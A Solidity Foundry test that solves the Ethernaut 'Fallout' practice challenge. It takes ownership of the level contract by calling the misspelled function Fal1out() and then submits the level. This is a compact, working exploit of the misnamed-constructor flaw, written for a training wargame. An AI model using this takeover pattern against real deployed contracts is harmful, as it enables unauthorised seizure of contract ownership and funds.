// SPDX-License-Identifier: MIT
pragma solidity >=0.8.0;

import "forge-std/Test.sol";
import "../Utils.sol";

interface IFallout {
  function Fal1out() external payable;
}

contract FalloutTest is Test {
  address internal challengeAddress;
  IFallout internal challenge;

  function setUp() public {
    challengeAddress = utils.createLevelInstance(0x9188cB1fBd5A9Bb9830174162FB787498A011f6a);
    challenge = IFallout(challengeAddress);
  }

  function testExploit() public {
    // meh... mispelled function
    challenge.Fal1out();

    utils.submitLevelInstance(challengeAddress);
  }
}
